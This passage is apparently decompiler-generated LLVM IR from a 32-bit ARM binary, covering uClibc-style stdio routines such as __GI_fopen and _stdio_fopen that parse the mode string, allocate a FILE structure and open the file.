  uselistorder label %dec_label_pc_15cd8, { 1, 0 }
  uselistorder label %dec_label_pc_15c90, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15c80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15c68, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15c08, { 1, 0 }
  uselistorder label %dec_label_pc_15bfc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_15bec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15bd4, { 1, 0 }
}

define i32 @function_15ea8(i32 %arg1) local_unnamed_addr {
dec_label_pc_15ea8:
  %v0_15ea8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15ea8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15ea8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15ea8, %bb
  %v10_15eb0 = phi i32 [ %arg1, %dec_label_pc_15ea8 ], [ 0, %bb ]
  ret i32 %v10_15eb0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15ec4 = call i32 @_stdio_fopen()
  ret i32 %v0_15ec4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15ed4 = load i32, i32* @r4, align 4
  store i32 %v3_15ed4, i32* %stack_var_-24, align 4
  %v6_15ed4 = load i32, i32* @r5, align 4
  %v9_15ed4 = load i32, i32* @r6, align 4
  %v12_15ed4 = load i32, i32* @r7, align 4
  %v15_15ed4 = load i32, i32* @r8, align 4
  %v0_15ed8 = load i32, i32* @r1, align 4
  %v1_15ed8 = inttoptr i32 %v0_15ed8 to i8*
  %v2_15ed8 = load i8, i8* %v1_15ed8, align 1
  %v2_15ee0 = icmp ugt i8 %v2_15ed8, 113
  store i1 %v2_15ee0, i1* %cpsr_c.global-to-local, align 1
  %v7_15ee0 = icmp eq i8 %v2_15ed8, 114
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* @r8, align 4
  %v0_15eec = load i32, i32* @r0, align 4
  store i32 %v0_15eec, i32* @r7, align 4
  %v0_15ef0 = load i32, i32* @r2, align 4
  store i32 %v0_15ef0, i32* @r5, align 4
  %v0_15ef4 = load i32, i32* @r3, align 4
  store i32 %v0_15ef4, i32* @r6, align 4
  br i1 %v7_15ee0, label %dec_label_pc_15f48, label %dec_label_pc_15efc

dec_label_pc_15efc:                               ; preds = %entry
  %v2_15efc = icmp ugt i8 %v2_15ed8, 118
  store i1 %v2_15efc, i1* %cpsr_c.global-to-local, align 1
  %v7_15efc = icmp eq i8 %v2_15ed8, 119
  br i1 %v7_15efc, label %bb, label %dec_label_pc_15f08

bb:                                               ; preds = %dec_label_pc_15efc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_15f4c

dec_label_pc_15f08:                               ; preds = %dec_label_pc_15efc
  %v2_15f08 = icmp ugt i8 %v2_15ed8, 96
  store i1 %v2_15f08, i1* %cpsr_c.global-to-local, align 1
  %v7_15f08 = icmp eq i8 %v2_15ed8, 97
  br i1 %v7_15f08, label %bb49, label %dec_label_pc_15f14

bb49:                                             ; preds = %dec_label_pc_15f08
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_15f4c

dec_label_pc_15f14:                               ; preds = %dec_label_pc_15f08, %dec_label_pc_15fe4, %dec_label_pc_15fb8
  store i32 49476, i32* %r2.global-to-local, align 4
  %v0_15f18 = call i32 @__aeabi_read_tp()
  store i32 %v0_15f18, i32* %r0.global-to-local, align 4
  %v3_15f1c = load i16, i16* @global_var_22068.345, align 2
  %v4_15f1c = sext i16 %v3_15f1c to i32
  store i32 %v4_15f1c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15f24 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f24 = icmp eq i32 %v0_15f24, 0
  %v3_15f28 = add i32 %v4_15f1c, %v0_15f18
  %v4_15f28 = inttoptr i32 %v3_15f28 to i32*
  store i32 22, i32* %v4_15f28, align 4
  br i1 %v2_15f24, label %dec_label_pc_162ec, label %dec_label_pc_15f30

dec_label_pc_15f30:                               ; preds = %dec_label_pc_16008._crit_edge, %dec_label_pc_15f14
  %v0_15f30 = load i32, i32* @r5, align 4
  %v1_15f30 = inttoptr i32 %v0_15f30 to i16*
  %v2_15f30 = load i16, i16* %v1_15f30, align 2
  %v3_15f30 = zext i16 %v2_15f30 to i32
  store i32 %v3_15f30, i32* %r3.global-to-local, align 4
  %v1_15f34 = and i32 %v3_15f30, 8192
  %v2_15f34 = icmp eq i32 %v1_15f34, 0
  br i1 %v2_15f34, label %dec_label_pc_162ec, label %dec_label_pc_15f3c

dec_label_pc_15f3c:                               ; preds = %dec_label_pc_15f30
  store i32 %v0_15f30, i32* @r0, align 4
  %v0_15f40 = call i32 @free()
  store i32 %v0_15f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_162ec

dec_label_pc_15f48:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15f4c

dec_label_pc_15f4c:                               ; preds = %bb, %bb49, %dec_label_pc_15f48
  %v1_15f64 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_15f48 ]
  %v1_15f4c = add i32 %v0_15ed8, 1
  %v2_15f4c = inttoptr i32 %v1_15f4c to i8*
  %v3_15f4c = load i8, i8* %v2_15f4c, align 1
  %v2_15f50 = icmp ugt i8 %v3_15f4c, 97
  store i1 %v2_15f50, i1* %cpsr_c.global-to-local, align 1
  %v7_15f50 = icmp eq i8 %v3_15f4c, 98
  %v1_15f4c.v0_15ed8 = select i1 %v7_15f50, i32 %v1_15f4c, i32 %v0_15ed8
  store i32 %v1_15f4c.v0_15ed8, i32* %r3.global-to-local, align 4
  %v1_15f5c = add i32 %v1_15f4c.v0_15ed8, 1
  %v2_15f5c = inttoptr i32 %v1_15f5c to i8*
  %v3_15f5c = load i8, i8* %v2_15f5c, align 1
  %v4_15f5c = zext i8 %v3_15f5c to i32
  store i32 %v4_15f5c, i32* @r3, align 4
  %v2_15f60 = icmp ugt i8 %v3_15f5c, 42
  store i1 %v2_15f60, i1* %cpsr_c.global-to-local, align 1
  %v7_15f60 = icmp eq i8 %v3_15f5c, 43
  br i1 %v7_15f60, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_15f4c
  store i32 %v1_15f64, i32* @r3, align 4
  %v2_15f68 = add nuw nsw i32 %v1_15f64, 1
  store i32 %v2_15f68, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15f4c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f6c = icmp eq i32 %v0_15ef0, 0
  br i1 %v2_15f6c, label %dec_label_pc_15f74, label %dec_label_pc_15fb0

dec_label_pc_15f74:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_15f78 = call i32 @malloc()
  store i32 %v0_15f78, i32* %r0.global-to-local, align 4
  store i32 %v0_15f78, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15f7c = icmp eq i32 %v0_15f78, 0
  br i1 %v3_15f7c, label %dec_label_pc_162f0, label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %dec_label_pc_15f74
  %v0_15f88 = load i32, i32* @r8, align 4
  %v2_15f88 = add i32 %v0_15f88, -33584
  store i32 %v2_15f88, i32* %r3.global-to-local, align 4
  %v1_15f8c = inttoptr i32 %v2_15f88 to i32*
  %v2_15f8c = load i32, i32* %v1_15f8c, align 4
  store i32 %v2_15f8c, i32* %r0.global-to-local, align 4
  %v3_15f8c = add i32 %v0_15f88, -33580
  %v4_15f8c = inttoptr i32 %v3_15f8c to i32*
  %v5_15f8c = load i32, i32* %v4_15f8c, align 4
  store i32 %v5_15f8c, i32* @r1, align 4
  %v6_15f8c = add i32 %v0_15f88, -33576
  %v7_15f8c = inttoptr i32 %v6_15f8c to i32*
  %v8_15f8c = load i32, i32* %v7_15f8c, align 4
  store i32 %v8_15f8c, i32* %r2.global-to-local, align 4
  %v2_15f98 = add i32 %v0_15f78, 8
  %v3_15f98 = inttoptr i32 %v2_15f98 to i32*
  store i32 0, i32* %v3_15f98, align 4
  %v2_15fa0 = load i32, i32* @r5, align 4
  %v3_15fa0 = inttoptr i32 %v2_15fa0 to i16*
  store i16 8192, i16* %v3_15fa0, align 2
  %v2_15fa4 = load i32, i32* %r0.global-to-local, align 4
  %v0_15fa8 = load i32, i32* @r5, align 4
  %v1_15fa8 = add i32 %v0_15fa8, 56
  store i32 %v1_15fa8, i32* @r3, align 4
  %v1_15fac = inttoptr i32 %v1_15fa8 to i32*
  store i32 %v2_15fa4, i32* %v1_15fac, align 4
  %v3_15fac = add i32 %v0_15fa8, 60
  %v4_15fac = inttoptr i32 %v3_15fac to i32*
  %v5_15fac = load i32, i32* @r1, align 4
  store i32 %v5_15fac, i32* %v4_15fac, align 4
  %v6_15fac = add i32 %v0_15fa8, 64
  %v7_15fac = inttoptr i32 %v6_15fac to i32*
  %v8_15fac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15fac, i32* %v7_15fac, align 4
  %v0_15fb0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15fb0

dec_label_pc_15fb0:                               ; preds = %.thread3, %dec_label_pc_15f84
  %v0_16008 = phi i32 [ %v0_15ef4, %.thread3 ], [ %v0_15fb0.pre, %dec_label_pc_15f84 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15fb0 = icmp slt i32 %v0_16008, 0
  br i1 %v1_15fb0, label %dec_label_pc_16008, label %dec_label_pc_15fb8

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fb0
  %v0_15fbc = load i32, i32* @r4, align 4
  %v2_15fbc = and i32 %v0_15fbc, 131075
  %v1_15fc0 = add nuw nsw i32 %v2_15fbc, 1
  store i32 %v1_15fc0, i32* %r2.global-to-local, align 4
  %v0_15fc4 = load i32, i32* @r7, align 4
  %v1_15fc4 = add i32 %v0_15fc4, 1
  %v2_15fc8 = and i32 %v1_15fc4, %v1_15fc0
  store i32 %v2_15fc8, i32* %r3.global-to-local, align 4
  %v3_15fcc = icmp uge i32 %v2_15fc8, %v1_15fc0
  store i1 %v3_15fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_15fcc = icmp eq i32 %v2_15fc8, %v1_15fc0
  %v1_15fd0 = load i32, i32* @r5, align 4
  %v2_15fd0 = add i32 %v1_15fd0, 4
  %v3_15fd0 = inttoptr i32 %v2_15fd0 to i32*
  store i32 %v0_16008, i32* %v3_15fd0, align 4
  br i1 %v9_15fcc, label %dec_label_pc_15fd8, label %dec_label_pc_15f14

dec_label_pc_15fd8:                               ; preds = %dec_label_pc_15fb8
  %v0_15fd8 = load i32, i32* @r4, align 4
  %v1_15fd8 = load i32, i32* @r7, align 4
  %v2_15fd8 = sub i32 -1, %v1_15fd8
  %v3_15fd8 = and i32 %v0_15fd8, %v2_15fd8
  store i32 %v3_15fd8, i32* @r3, align 4
  %v1_15fdc = and i32 %v3_15fd8, 1024
  %v2_15fdc = icmp eq i32 %v1_15fdc, 0
  br i1 %v2_15fdc, label %dec_label_pc_15ffc, label %dec_label_pc_15fe4

dec_label_pc_15fe4:                               ; preds = %dec_label_pc_15fd8
  %v0_15fe4 = load i32, i32* @r6, align 4
  store i32 %v0_15fe4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15ff0 = call i32 @__libc_fcntl(i32 %v0_15fe4, i32 4)
  store i32 %v2_15ff0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ff4 = icmp eq i32 %v2_15ff0, 0
  br i1 %v2_15ff4, label %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge, label %dec_label_pc_15f14

dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15fe4
  %v0_15ffc.pre = load i32, i32* @r7, align 4
  %v0_16000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge, %dec_label_pc_15fd8
  %v0_16000 = phi i32 [ %v0_16000.pre, %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge ], [ %v0_15fd8, %dec_label_pc_15fd8 ]
  %v0_15ffc = phi i32 [ %v0_15ffc.pre, %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge ], [ %v1_15fd8, %dec_label_pc_15fd8 ]
  %v1_15ffc = and i32 %v0_15ffc, 131072
  store i32 %v1_15ffc, i32* %r3.global-to-local, align 4
  %v2_16000 = or i32 %v1_15ffc, %v0_16000
  store i32 %v2_16000, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1602c

dec_label_pc_16008:                               ; preds = %dec_label_pc_15fb0
  %v2_16008 = icmp eq i32 %v0_16008, -1
  store i1 %v2_16008, i1* %cpsr_c.global-to-local, align 1
  %v7_16008 = icmp eq i32 %v0_16008, -1
  %v0_16014.pre = load i32, i32* @r4, align 4
  br i1 %v7_16008, label %dec_label_pc_16008._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_16008
  %v2_1600c = or i32 %v0_16014.pre, 131072
  store i32 %v2_1600c, i32* @r4, align 4
  br label %dec_label_pc_16008._crit_edge

dec_label_pc_16008._crit_edge:                    ; preds = %dec_label_pc_16008, %bb53
  %v0_16014 = phi i32 [ %v2_1600c, %bb53 ], [ %v0_16014.pre, %dec_label_pc_16008 ]
  %v0_16010 = load i32, i32* @r7, align 4
  store i32 %v0_16010, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_1601c = inttoptr i32 %v0_16014 to i32*
  %v3_1601c = call i32 @__libc_open(i32 %v0_16010, i32* %v2_1601c)
  store i32 %v3_1601c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16020 = icmp slt i32 %v3_1601c, 0
  %v1_16024 = load i32, i32* @r5, align 4
  %v2_16024 = add i32 %v1_16024, 4
  %v3_16024 = inttoptr i32 %v2_16024 to i32*
  store i32 %v3_1601c, i32* %v3_16024, align 4
  br i1 %v1_16020, label %dec_label_pc_15f30, label %.dec_label_pc_1602c_crit_edge

.dec_label_pc_1602c_crit_edge:                    ; preds = %dec_label_pc_16008._crit_edge
  %v0_16030.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1602c

dec_label_pc_1602c:                               ; preds = %.dec_label_pc_1602c_crit_edge, %dec_label_pc_15ffc
  %v0_16048 = phi i32 [ %v0_16030.pre, %.dec_label_pc_1602c_crit_edge ], [ %v2_16000, %dec_label_pc_15ffc ]
  %v0_1602c = load i32, i32* @r5, align 4
  %v1_1602c = inttoptr i32 %v0_1602c to i16*
  %v2_1602c = load i16, i16* %v1_1602c, align 2
  %v3_1602c = zext i16 %v2_1602c to i32
  %v1_16030 = urem i32 %v0_16048, 4
  %v1_16034 = and i32 %v0_16048, 1024
  %v1_16038 = and i32 %v3_1602c, 8192
  %v1_1603c = add nuw nsw i32 %v1_16030, 1
  %v2_16040 = or i32 %v1_16038, %v1_16034
  store i32 %v2_16040, i32* %r3.global-to-local, align 4
  %v1_16044 = xor i32 %v1_1603c, 3
  %v1_16048 = and i32 %v0_16048, 131072
  store i32 %v1_16048, i32* %r2.global-to-local, align 4
  %v2_16048 = icmp eq i32 %v1_16048, 0
  %v1_1604c = add i32 %v0_1602c, 4
  %v2_1604c = inttoptr i32 %v1_1604c to i32*
  %v3_1604c = load i32, i32* %v2_1604c, align 4
  store i32 %v3_1604c, i32* @r4, align 4
  br i1 %v2_16048, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1602c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1602c, %bb54
  %v0_16058 = phi i32 [ 0, %dec_label_pc_1602c ], [ 32768, %bb54 ]
  %v4_16054 = mul nuw nsw i32 %v1_16044, 16
  %v5_16054 = or i32 %v2_16040, %v4_16054
  store i32 %v5_16054, i32* %r3.global-to-local, align 4
  %v2_16058 = or i32 %v0_16058, %v5_16054
  store i32 %v2_16058, i32* %r2.global-to-local, align 4
  %v2_1605c = icmp ugt i32 %v3_1604c, 2147483646
  store i1 %v2_1605c, i1* %cpsr_c.global-to-local, align 1
  %v8_1605c = icmp eq i32 %v3_1604c, 2147483647
  %v1_16060 = trunc i32 %v2_16058 to i16
  store i16 %v1_16060, i16* %v1_1602c, align 2
  br i1 %v8_1605c, label %dec_label_pc_160a0, label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %bb55
  store i32 49136, i32* %r3.global-to-local, align 4
  %v0_1606c = call i32 @__aeabi_read_tp()
  %v3_16070 = load i16, i16* @global_var_22068.345, align 2
  %v4_16070 = sext i16 %v3_16070 to i32
  store i32 %v4_16070, i32* @r3, align 4
  store i32 %v0_1606c, i32* @r6, align 4
  %v0_16078 = load i32, i32* @r4, align 4
  store i32 %v0_16078, i32* @r0, align 4
  %v2_1607c = add i32 %v4_16070, %v0_1606c
  %v3_1607c = inttoptr i32 %v2_1607c to i32*
  %v4_1607c = load i32, i32* %v3_1607c, align 4
  store i32 %v4_1607c, i32* @r4, align 4
  %v1_16080 = call i32 @isatty(i32 %v0_16078)
  store i32 %v1_16080, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16084 = icmp eq i32 %v1_16080, 0
  br i1 %v2_16084, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_16068
  %v1_16088 = load i32, i32* @r5, align 4
  %v2_16088 = inttoptr i32 %v1_16088 to i16*
  %v3_16088 = load i16, i16* %v2_16088, align 2
  %v4_16088 = zext i16 %v3_16088 to i32
  %v2_1608c = or i32 %v4_16088, 256
  store i32 %v2_1608c, i32* %r3.global-to-local, align 4
  %v2_16090 = trunc i32 %v2_1608c to i16
  store i16 %v2_16090, i16* %v2_16088, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_16068, %bb56
  %v3_16098 = load i16, i16* @global_var_22068.345, align 2
  %v4_16098 = sext i16 %v3_16098 to i32
  store i32 %v4_16098, i32* %r3.global-to-local, align 4
  %v0_1609c = load i32, i32* @r4, align 4
  %v1_1609c = load i32, i32* @r6, align 4
  %v3_1609c = add i32 %v1_1609c, %v4_16098
  %v4_1609c = inttoptr i32 %v3_1609c to i32*
  store i32 %v0_1609c, i32* %v4_1609c, align 4
  br label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %bb55, %.thread5
  %v0_160a0 = load i32, i32* @r5, align 4
  %v1_160a0 = add i32 %v0_160a0, 8
  %v2_160a0 = inttoptr i32 %v1_160a0 to i32*
  %v3_160a0 = load i32, i32* %v2_160a0, align 4
  store i32 %v3_160a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160a4 = icmp eq i32 %v3_160a0, 0
  br i1 %v2_160a4, label %dec_label_pc_160ac, label %bb57

dec_label_pc_160ac:                               ; preds = %dec_label_pc_160a0
  store i32 4096, i32* @r0, align 4
  %v0_160b0 = call i32 @malloc()
  store i32 %v0_160b0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160b4 = icmp eq i32 %v0_160b0, 0
  %v1_160c4.pre = load i32, i32* @r5, align 4
  br i1 %v2_160b4, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_160ac
  %v2_160b8 = inttoptr i32 %v1_160c4.pre to i16*
  %v3_160b8 = load i16, i16* %v2_160b8, align 2
  %v4_160b8 = zext i16 %v3_160b8 to i32
  %v2_160bc = add i32 %v0_160b0, 4096
  store i32 %v2_160bc, i32* %r2.global-to-local, align 4
  %v2_160c0 = or i32 %v4_160b8, 16384
  store i32 %v2_160c0, i32* %r3.global-to-local, align 4
  %v2_160c4 = add i32 %v1_160c4.pre, 8
  %v3_160c4 = inttoptr i32 %v2_160c4 to i32*
  store i32 %v0_160b0, i32* %v3_160c4, align 4
  %v1_160c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_160c8 = load i32, i32* @r5, align 4
  %v3_160c8 = add i32 %v2_160c8, 12
  %v4_160c8 = inttoptr i32 %v3_160c8 to i32*
  store i32 %v1_160c8, i32* %v4_160c8, align 4
  %v1_160cc = load i32, i32* %r3.global-to-local, align 4
  %v2_160cc = trunc i32 %v1_160cc to i16
  %v3_160cc = load i32, i32* @r5, align 4
  %v4_160cc = inttoptr i32 %v3_160cc to i16*
  store i16 %v2_160cc, i16* %v4_160cc, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_160ac
  %v2_160c437 = add i32 %v1_160c4.pre, 8
  %v3_160c438 = inttoptr i32 %v2_160c437 to i32*
  store i32 0, i32* %v3_160c438, align 4
  %v2_160d0 = load i32, i32* @r5, align 4
  %v3_160d0 = add i32 %v2_160d0, 12
  %v4_160d0 = inttoptr i32 %v3_160d0 to i32*
  store i32 0, i32* %v4_160d0, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_160a0, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_160dc = load i32, i32* @r8, align 4
  %v2_160dc = add i32 %v0_160dc, 92
  %v3_160dc = inttoptr i32 %v2_160dc to i32*
  %v4_160dc = load i32, i32* %v3_160dc, align 4
  store i32 %v4_160dc, i32* %r3.global-to-local, align 4
  %v2_160e0 = load i32, i32* @r5, align 4
  %v3_160e0 = add i32 %v2_160e0, 2
  %v4_160e0 = inttoptr i32 %v3_160e0 to i8*
  store i8 0, i8* %v4_160e0, align 1
  %v0_160e4 = load i32, i32* @r5, align 4
  %v1_160e4 = inttoptr i32 %v0_160e4 to i16*
  %v2_160e4 = load i16, i16* %v1_160e4, align 2
  %v3_160e4 = zext i16 %v2_160e4 to i32
  store i32 %v3_160e4, i32* %r2.global-to-local, align 4
  %v0_160e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_160e8 = inttoptr i32 %v0_160e8 to i32*
  %v2_160e8 = load i32, i32* %v1_160e8, align 4
  store i32 %v2_160e8, i32* @r1, align 4
  %v1_160ec = add i32 %v0_160e4, 8
  %v2_160ec = inttoptr i32 %v1_160ec to i32*
  %v3_160ec = load i32, i32* %v2_160ec, align 4
  store i32 %v3_160ec, i32* %r3.global-to-local, align 4
  %v1_160f0 = and i32 %v3_160e4, 8192
  %v2_160f0 = icmp eq i32 %v1_160f0, 0
  %v2_160f4 = add i32 %v0_160e4, 20
  %v3_160f4 = inttoptr i32 %v2_160f4 to i32*
  store i32 %v3_160ec, i32* %v3_160f4, align 4
  %v0_160f8 = load i32, i32* @r1, align 4
  %v1_160f8 = load i32, i32* @r5, align 4
  %v2_160f8 = add i32 %v1_160f8, 52
  %v3_160f8 = inttoptr i32 %v2_160f8 to i32*
  store i32 %v0_160f8, i32* %v3_160f8, align 4
  %v0_160fc = load i32, i32* %r3.global-to-local, align 4
  %v1_160fc = load i32, i32* @r5, align 4
  %v2_160fc = add i32 %v1_160fc, 24
  %v3_160fc = inttoptr i32 %v2_160fc to i32*
  store i32 %v0_160fc, i32* %v3_160fc, align 4
  %v0_16100 = load i32, i32* %r3.global-to-local, align 4
  %v1_16100 = load i32, i32* @r5, align 4
  %v2_16100 = add i32 %v1_16100, 28
  %v3_16100 = inttoptr i32 %v2_16100 to i32*
  store i32 %v0_16100, i32* %v3_16100, align 4
  %v0_16104 = load i32, i32* %r3.global-to-local, align 4
  %v1_16104 = load i32, i32* @r5, align 4
  %v2_16104 = add i32 %v1_16104, 16
  %v3_16104 = inttoptr i32 %v2_16104 to i32*
  store i32 %v0_16104, i32* %v3_16104, align 4
  %v0_16108 = load i32, i32* %r4.global-to-local, align 4
  %v1_16108 = load i32, i32* @r5, align 4
  %v2_16108 = add i32 %v1_16108, 44
  %v3_16108 = inttoptr i32 %v2_16108 to i32*
  store i32 %v0_16108, i32* %v3_16108, align 4
  br i1 %v2_160f0, label %dec_label_pc_162f0, label %dec_label_pc_16110

dec_label_pc_16110:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16114 = load i32, i32* @r8, align 4
  %v2_16114 = add i32 %v0_16114, 160
  %v3_16114 = inttoptr i32 %v2_16114 to i32*
  %v4_16114 = load i32, i32* %v3_16114, align 4
  store i32 %v4_16114, i32* %r7.global-to-local, align 4
  %v0_16118 = call i32 @__aeabi_read_tp()
  store i32 %v0_16118, i32* %r0.global-to-local, align 4
  %v1_1611c = add i32 %v4_16114, 8
  %v2_1611c = inttoptr i32 %v1_1611c to i32*
  %v3_1611c = load i32, i32* %v2_1611c, align 4
  store i32 %v3_1611c, i32* %r3.global-to-local, align 4
  %v1_16120 = add i32 %v0_16118, -1168
  store i32 %v1_16120, i32* %r6.global-to-local, align 4
  %v3_16124 = icmp uge i32 %v3_1611c, %v1_16120
  store i1 %v3_16124, i1* %cpsr_c.global-to-local, align 1
  %v9_16124 = icmp eq i32 %v3_1611c, %v1_16120
  br i1 %v9_16124, label %dec_label_pc_16168, label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16110
  store i32 %v4_16114, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_16140.dec_label_pc_16134_crit_edge, %dec_label_pc_1612c
  %v0_16134 = phi i32 [ %v0_16134.pre, %dec_label_pc_16140.dec_label_pc_16134_crit_edge ], [ %v4_16114, %dec_label_pc_1612c ]
  %v1_16134 = inttoptr i32 %v0_16134 to i32*
  %v2_16134 = load i32, i32* %v1_16134, align 4
  store i32 %v2_16134, i32* %r3.global-to-local, align 4
  %v1_16138 = load i32, i32* %r4.global-to-local, align 4
  %v3_16138 = icmp uge i32 %v2_16134, %v1_16138
  store i1 %v3_16138, i1* %cpsr_c.global-to-local, align 1
  %v9_16138 = icmp eq i32 %v2_16134, %v1_16138
  br i1 %v9_16138, label %dec_label_pc_16140, label %dec_label_pc_16158

dec_label_pc_16140:                               ; preds = %dec_label_pc_16134
  store i32 %v2_16134, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16150 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16150, label %dec_label_pc_16154, label %dec_label_pc_16140.dec_label_pc_16134_crit_edge

dec_label_pc_16140.dec_label_pc_16134_crit_edge:  ; preds = %dec_label_pc_16140
  %v0_16134.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16154:                               ; preds = %dec_label_pc_16140
  %v0_16154 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16154, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_16134, %dec_label_pc_16154
  %v0_16158 = phi i32 [ %v0_16154, %dec_label_pc_16154 ], [ %v2_16134, %dec_label_pc_16134 ]
  %v1_16158 = phi i32 [ %v0_16154, %dec_label_pc_16154 ], [ %v1_16138, %dec_label_pc_16134 ]
  %v3_16158 = icmp uge i32 %v0_16158, %v1_16158
  store i1 %v3_16158, i1* %cpsr_c.global-to-local, align 1
  %v9_16158 = icmp eq i32 %v0_16158, %v1_16158
  br i1 %v9_16158, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_16158
  %v1_1615c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1615c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_16158, %bb58
  %v1_16160 = xor i1 %v9_16158, true
  call void @__pseudo_cond_branch(i1 %v1_16160, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_16164 = load i32, i32* %r6.global-to-local, align 4
  %v1_16164 = load i32, i32* %r7.global-to-local, align 4
  %v2_16164 = add i32 %v1_16164, 8
  %v3_16164 = inttoptr i32 %v2_16164 to i32*
  store i32 %v0_16164, i32* %v3_16164, align 4
  %v1_16184.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16168

dec_label_pc_16168:                               ; preds = %dec_label_pc_16110, %bb59
  %v1_16184 = phi i32 [ %v3_1611c, %dec_label_pc_16110 ], [ %v1_16184.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1616c = load i32, i32* @r8, align 4
  %v2_1616c = add i32 %v0_1616c, 160
  %v3_1616c = inttoptr i32 %v2_1616c to i32*
  %v4_1616c = load i32, i32* %v3_1616c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16174 = add i32 %v0_1616c, 152
  %v3_16174 = inttoptr i32 %v2_16174 to i32*
  %v4_16174 = load i32, i32* %v3_16174, align 4
  store i32 %v4_16174, i32* %r7.global-to-local, align 4
  %v1_16178 = add i32 %v4_1616c, 4
  %v2_16178 = inttoptr i32 %v1_16178 to i32*
